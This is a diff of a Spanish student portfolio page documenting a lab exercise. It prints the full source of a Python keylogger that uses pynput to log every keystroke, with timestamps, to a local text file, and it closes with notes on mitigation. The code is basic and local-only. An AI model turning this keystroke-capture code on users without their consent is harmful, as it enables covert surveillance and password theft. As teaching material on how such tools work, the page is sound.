@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Actividad 03 - Parcial 1 | Portafolio WAP</title>
   <link rel="stylesheet" href="../../../assets/css/styles.css">
 </head>
+
 <body>
 
   <!-- Header Hero -->
@@ -26,9 +28,10 @@
     <nav class="site-nav-hero">
       <ul>
         <li><a href="../../../index.html">Inicio</a></li>
-        <li><a href="../parcial1.html" class="active">Parcial 1</a></li>
+        <li><a href="../parcial1.html">Parcial 1</a></li>
         <li><a href="#" class="disabled">Parcial 2</a></li>
         <li><a href="#" class="disabled">Parcial 3</a></li>
+        <li><a href="../roadmap/roadmap.html">Roadmap</a></li>
         <li><a href="../../../index.html#contacto">Contacto</a></li>
       </ul>
     </nav>
@@ -37,17 +40,18 @@
   <!-- Contenedor Principal -->
   <main class="content-container">
     <nav class="side-nav-right" id="sideNav">
-        <div class="side-nav-title">Navegación</div>
-          <ul>
-            <li><a href="../../../index.html">Inicio</a></li>
-            <li><a href="../parcial1.html">Parcial 1</a></li>
-            <li><a href="#" class="disabled">Parcial 2</a></li>
-            <li><a href="#" class="disabled">Parcial 3</a></li>
-            <li><a href="../../../index.html#contacto">Contacto</a></li>
-        </ul>
-      </nav>
+      <div class="side-nav-title">Navegación</div>
+      <ul>
+        <li><a href="../../../index.html">Inicio</a></li>
+        <li><a href="../parcial1.html">Parcial 1</a></li>
+        <li><a href="#" class="disabled">Parcial 2</a></li>
+        <li><a href="#" class="disabled">Parcial 3</a></li>
+        <li><a href="../roadmap/roadmap.html">Roadmap</a></li>
+        <li><a href="../../../index.html#contacto">Contacto</a></li>
+      </ul>
+    </nav>
     <article class="card card-detail">
-      
+
       <!-- Encabezado de la Actividad -->
       <div class="detail-header-badge">
         <span class="badge-tag">Parcial 1 — Actividad 03</span>
@@ -58,9 +62,11 @@
       <section class="detail-section">
         <h2 class="section-subheading">Introducción</h2>
         <p>
-          En esta actividad se explora el funcionamiento técnico de la captura de eventos de teclado mediante 
-          <em>event hooks</em> y funciones <em>callbacks</em> en Python. El objetivo es analizar los mecanismos de entrada de datos, 
-          su persistencia local y las implicaciones de ciberseguridad asociadas al monitoreo no autorizado de pulsaciones de teclas (keylogging).
+          En esta actividad se explora el funcionamiento técnico de la captura de eventos de teclado mediante
+          <em>event hooks</em> y funciones <em>callbacks</em> en Python. El objetivo es analizar los mecanismos de
+          entrada de datos,
+          su persistencia local y las implicaciones de ciberseguridad asociadas al monitoreo no autorizado de
+          pulsaciones de teclas (keylogging).
         </p>
       </section>
 
@@ -68,8 +74,10 @@
       <section class="detail-section">
         <h2 class="section-subheading">Objetivo</h2>
         <p>
-          Implementar y documentar un programa basado en hooks de teclado que registre cada evento de pulsación y liberación de teclas, 
-          asociándolos de manera temporal con alta precisión y almacenándolos de forma persistente en un archivo local para su posterior análisis.
+          Implementar y documentar un programa basado en hooks de teclado que registre cada evento de pulsación y
+          liberación de teclas,
+          asociándolos de manera temporal con alta precisión y almacenándolos de forma persistente en un archivo local
+          para su posterior análisis.
         </p>
       </section>
       <!-- Configuración del Laboratorio -->
@@ -78,101 +86,114 @@
         <div class="tech-grid">
           <div class="tech-box">
             <div class="tech-title">Sistema Operativo</div>
-              <div class="tech-pills">
-                  <span class="pill">Windows 10</span>
-              </div>
+            <div class="tech-pills">
+              <span class="pill">Windows 10</span>
+            </div>
           </div>
 
           <div class="tech-box">
             <div class="tech-title">Lenguaje de programación</div>
-              <div class="tech-pills">
-                  <span class="pill">Python</span>
-              </div>
+            <div class="tech-pills">
+              <span class="pill">Python</span>
+            </div>
           </div>
           <div class="tech-box">
             <div class="tech-title">Librerías</div>
-              <div class="tech-pills">
-                  <span class="pill">pynput</span>
-                  <span class="pill">datetime</span>
-              </div> 
-          </div>    
+            <div class="tech-pills">
+              <span class="pill">pynput</span>
+              <span class="pill">datetime</span>
+            </div>
+          </div>
         </div>
       </section>
       <!-- Funcionamiento -->
       <section class="detail-section">
         <h2 class="section-subheading">Funcionamiento</h2>
         <p>
-          El programa hace uso de la clase <code>Listener</code> para suscribirse a las llamadas del sistema operativo encargadas de los eventos de teclado.
-          Cada evento detectado activa una función de respuesta (<code>on_press</code> o <code>on_release</code>), la cual realiza tres acciones principales:
+          El programa hace uso de la clase <code>Listener</code> para suscribirse a las llamadas del sistema operativo
+          encargadas de los eventos de teclado.
+          Cada evento detectado activa una función de respuesta (<code>on_press</code> o <code>on_release</code>), la
+          cual realiza tres acciones principales:
         </p>
         <ul class="custom-list">
-          <li><strong>Asociación Temporal y Secuencial:</strong> Asigna una marca de tiempo con precisión de milisegundos (<code>YYYY-MM-DD HH:MM:SS.mmm</code>) y un contador incremental formateado a tres dígitos (<code>evento_001</code>).</li>
-          <li><strong>Manejo de Excepciones:</strong> Diferencia entre teclas alfanuméricas estándar y teclas especiales de sistema (como <code>Key.esc</code> o <code>Key.space</code>).</li>
-          <li><strong>Persistencia Local:</strong> Apertura continua en modo <em>append</em> (<code>"a"</code>) hacia el archivo <code>registrodeteclado.txt</code>, garantizando que todos los registros permanezcan guardados tras la finalización del hilo principal mediante la tecla <code>Esc</code>.</li>
+          <li><strong>Asociación Temporal y Secuencial:</strong> Asigna una marca de tiempo con precisión de
+            milisegundos (<code>YYYY-MM-DD HH:MM:SS.mmm</code>) y un contador incremental formateado a tres dígitos
+            (<code>evento_001</code>).</li>
+          <li><strong>Manejo de Excepciones:</strong> Diferencia entre teclas alfanuméricas estándar y teclas especiales
+            de sistema (como <code>Key.esc</code> o <code>Key.space</code>).</li>
+          <li><strong>Persistencia Local:</strong> Apertura continua en modo <em>append</em> (<code>"a"</code>) hacia el
+            archivo <code>registrodeteclado.txt</code>, garantizando que todos los registros permanezcan guardados tras
+            la finalización del hilo principal mediante la tecla <code>Esc</code>.</li>
         </ul>
       </section>
       <!-- Código Fuente en Ventana Morada Central -->
       <section class="detail-section">
         <h2 class="section-subheading">Código Fuente / Script</h2>
-        <p class="section-desc">A continuación se presenta el código desarrollado utilizando la librería <code>pynput</code> y el módulo <code>datetime</code> para la gestión de registros con timestamp:</p>
-        
+        <p class="section-desc">A continuación se presenta el código desarrollado utilizando la librería
+          <code>pynput</code> y el módulo <code>datetime</code> para la gestión de registros con timestamp:
+        </p>
+
         <!-- Contenedor Estilo Ventana IDE -->
         <div class="code-window">
           <div class="code-window-bar">
             <div class="code-dots">
-              <span class="dot-btn #140972"></span>
-              <span class="dot-btn #3940aa"></span>
-              <span class="dot-btn #786ecf"></span>
+              <span class="dot-btn dark-purple"></span>
+              <span class="dot-btn blue"></span>
+              <span class="dot-btn lavender"></span>
             </div>
             <span class="code-title">keylogger_script.py</span>
           </div>
           <div class="code-scroll-container">
-            <pre class="code-block"><code>import datetime
-from pynput.keyboard import Key, Listener
-
-LOG_FILE = "registrodeteclado.txt"
-contador_eventos = 1
-
-def formato_evento(accion, key_str):
-    global contador_eventos
-    now = datetime.datetime.now()
-    timestamp = now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-    id_evento = f"evento_{contador_eventos:03d}"
-    contador_eventos += 1
-    return f"{timestamp} | {accion} | {id_evento} | Tecla: {key_str}\n"
-
-def log_to_file(entrada):
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(entrada)
-
-def on_press(key):
-    try:
-        key_str = key.char
-    except AttributeError:
-        key_str = str(key)
-    log_entry = formato_evento("PRESS", key_str)
-    print(log_entry.strip())
-    log_to_file(log_entry)
-
-def on_release(key):
-    try:
-        key_str = key.char
-    except AttributeError:
-        key_str = str(key)
-        
-    log_entry = formato_evento("RELEASE", key_str)
-    print(log_entry.strip())
-    log_to_file(log_entry)
-    
-    if key == Key.esc:
-        return False
-
-if __name__ == "__main__":
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"\n--- Inicio de Sesión: {datetime.datetime.now()} ---\n")
-        
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()</code></pre>
+            <pre class="code-block">
+              <code>
+                        import datetime
+                        from pynput.keyboard import Key, Listener
+                        
+                        LOG_FILE = "registrodeteclado.txt"
+                        contador_eventos = 1
+                        
+                        def formato_evento(accion, key_str):
+                            global contador_eventos
+                            now = datetime.datetime.now()
+                            timestamp = now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+                            id_evento = f"evento_{contador_eventos:03d}"
+                            contador_eventos += 1
+                            return f"{timestamp} | {accion} | {id_evento} | Tecla: {key_str}\n"
+                        
+                        def log_to_file(entrada):
+                            with open(LOG_FILE, "a", encoding="utf-8") as f:
+                                f.write(entrada)
+                        
+                        def on_press(key):
+                            try:
+                                key_str = key.char
+                            except AttributeError:
+                                key_str = str(key)
+                            log_entry = formato_evento("PRESS", key_str)
+                            print(log_entry.strip())
+                            log_to_file(log_entry)
+                        
+                        def on_release(key):
+                            try:
+                                key_str = key.char
+                            except AttributeError:
+                                key_str = str(key)
+                                
+                            log_entry = formato_evento("RELEASE", key_str)
+                            print(log_entry.strip())
+                            log_to_file(log_entry)
+                            
+                            if key == Key.esc:
+                                return False
+                        
+                        if __name__ == "__main__":
+                            with open(LOG_FILE, "a", encoding="utf-8") as f:
+                                f.write(f"\n--- Inicio de Sesión: {datetime.datetime.now()} ---\n")
+                                
+                            with Listener(on_press=on_press, on_release=on_release) as listener:
+                                listener.join()
+              </code>
+            </pre>
           </div>
         </div>
       </section>
@@ -181,28 +202,36 @@ if __name__ == "__main__":
       <!-- Evidencias / Galería de Imágenes en Columnas -->
       <section class="detail-section">
         <h2 class="section-subheading">Pruebas Realizadas</h2>
-        <p class="section-desc">A continuación se presentan las evidencias del correcto funcionamiento del script y la persistencia de datos alcanzada:</p>
-        
+        <p class="section-desc">A continuación se presentan las evidencias del correcto funcionamiento del script y la
+          persistencia de datos alcanzada:</p>
+
         <div class="evidence-grid">
           <figure class="evidence-card">
             <div class="image-wrapper">
-              <img src="../imagenes/actividad3_terminal_parcial1.PNG" alt="Ejecución de la consola registrando teclas en tiempo real" class="img-fluid">
+              <img src="../imagenes/actividad3_terminal_parcial1.PNG"
+                alt="Ejecución de la consola registrando teclas en tiempo real" class="img-fluid">
             </div>
-            <figcaption><strong>Figura 1:</strong> Captura de la terminal mostrando el registro ordenado con timestamp y ID de evento.</figcaption>
+            <figcaption><strong>Figura 1:</strong> Captura de la terminal mostrando el registro ordenado con timestamp y
+              ID de evento.</figcaption>
           </figure>
 
           <figure class="evidence-card">
             <div class="image-wrapper">
-              <img src="../imagenes/actividad3_txt_parcial1.PNG" alt="Archivo de texto abierto mostrando los eventos guardados" class="img-fluid">
+              <img src="../imagenes/actividad3_txt_parcial1.PNG"
+                alt="Archivo de texto abierto mostrando los eventos guardados" class="img-fluid">
             </div>
-            <figcaption><strong>Figura 2:</strong> Verificación del archivo <code>registrodeteclado.txt</code> abierto en el editor tras detener la ejecución.</figcaption>
+            <figcaption><strong>Figura 2:</strong> Verificación del archivo <code>registrodeteclado.txt</code> abierto
+              en el editor tras detener la ejecución.</figcaption>
           </figure>
 
           <figure class="evidence-card">
             <div class="image-wrapper">
-              <img src="../imagenes/actividad3_keysespeciales_parcial1.PNG" alt="Detención de keys especiales y ESC" class="img-fluid">
+              <img src="../imagenes/actividad3_keysespeciales_parcial1.PNG" alt="Detención de keys especiales y ESC"
+                class="img-fluid">
             </div>
-            <figcaption><strong>Figura 3:</strong> Demostración de la detención del listener al presionar la tecla <code>Esc</code>, finalizando la captura de eventos. Y como detecta Keys especiales.</figcaption>
+            <figcaption><strong>Figura 3:</strong> Demostración de la detención del listener al presionar la tecla
+              <code>Esc</code>, finalizando la captura de eventos. Y como detecta Keys especiales.
+            </figcaption>
 
           </figure>
         </div>
@@ -210,27 +239,37 @@ if __name__ == "__main__":
       <section class="detail-section">
         <h2 class="section-subheading">Conclusión</h2>
         <p>
-          El desarrollo de esta actividad permitió analizar de forma práctica el funcionamiento interno de las herramientas de espionaje del tipo keylogger. Mediante el uso de ganchos de eventos (hooks) y funciones de respuesta (callbacks), es posible interceptar cualquier interacción física en el teclado de forma transparente para el usuario. 
+          El desarrollo de esta actividad permitió analizar de forma práctica el funcionamiento interno de las
+          herramientas de espionaje del tipo keylogger. Mediante el uso de ganchos de eventos (hooks) y funciones de
+          respuesta (callbacks), es posible interceptar cualquier interacción física en el teclado de forma transparente
+          para el usuario.
         </p>
         <p>
-          La implementación de la asociación temporal (timestamps) no solo permite reconstruir lo ingresado, sino que abre la puerta a análisis de comportamiento (como inferir patrones de tecleo o contraseñas). Como medida de mitigación, se resalta la importancia de implementar soluciones antivirus que detecten llamadas a APIs de bajo nivel, el uso de teclados virtuales dinámicos y la aplicación del principio de mínimo privilegio para prevenir la ejecución no autorizada de estos scripts.
+          La implementación de la asociación temporal (timestamps) no solo permite reconstruir lo ingresado, sino que
+          abre la puerta a análisis de comportamiento (como inferir patrones de tecleo o contraseñas). Como medida de
+          mitigación, se resalta la importancia de implementar soluciones antivirus que detecten llamadas a APIs de bajo
+          nivel, el uso de teclados virtuales dinámicos y la aplicación del principio de mínimo privilegio para prevenir
+          la ejecución no autorizada de estos scripts.
         </p>
       </section>
       <!--PDF -->
-    <section class="detail-section">
+      <section class="detail-section">
         <h2 class="section-subheading">Documentación de la práctica (PDF)</h2>
         <p class="section-desc">
-          Puedes consultar el reporte completo de la práctica directamente a continuación o descargarlo en tu dispositivo:
+          Puedes consultar el reporte completo de la práctica directamente a continuación o descargarlo en tu
+          dispositivo:
         </p>
-    
+
         <!-- Visor Integrado (Embed / Iframe) -->
-        <div style="width: 100%; height: 650px; border-radius: 16px; overflow: hidden; border: 1.5px solid #d8b4fe; box-shadow: 0 10px 25px rgba(124, 58, 237, 0.1);">
+        <div
+          style="width: 100%; height: 650px; border-radius: 16px; overflow: hidden; border: 1.5px solid #d8b4fe; box-shadow: 0 10px 25px rgba(124, 58, 237, 0.1);">
           <iframe src="../docs/Actividad 03_parcial1.pdf" width="100%" height="100%" style="border: none;">
-            <p>Tu navegador no soporta la visualización de archivos PDF. <a href="../docs/Actividad 03_parcial1.pdf">Haz clic aquí para descargarlo.</a></p>
+            <p>Tu navegador no soporta la visualización de archivos PDF. <a href="../docs/Actividad 03_parcial1.pdf">Haz
+                clic aquí para descargarlo.</a></p>
           </iframe>
         </div>
       </section>
-      
+
       <!-- Navegación entre Actividades -->
       <nav class="activity-navigation">
         <a href="../actividades/actividad2_p1.html" class="btn-nav">← Anterior actividad</a>
@@ -247,13 +286,16 @@ if __name__ == "__main__":
     <div class="footer-links">
       <h3>Recursos Profesionales</h3>
       <ul class="social-cv-links">
-        <li><a href="https://www.linkedin.com/in/andrea-morua-01092732b/" target="_blank" rel="noopener noreferrer">LinkedIn</a></li>
+        <li><a href="https://www.linkedin.com/in/andrea-morua-01092732b/" target="_blank"
+            rel="noopener noreferrer">LinkedIn</a></li>
         <li><a href="https://github.com/Andreamoruaa" target="_blank" rel="noopener noreferrer">GitHub</a></li>
-        <li><a href="../../../assets/docs/Andrea Morua Bravo CV.pdf" target="_blank" rel="noopener noreferrer">Curriculum Vitae</a></li>
+        <li><a href="../../../assets/docs/Andrea Morua Bravo CV.pdf" target="_blank"
+            rel="noopener noreferrer">Curriculum Vitae</a></li>
       </ul>
     </div>
   </footer>
 
   <script src="../../../assets/js/main.js"></script>
 </body>
+
 </html>
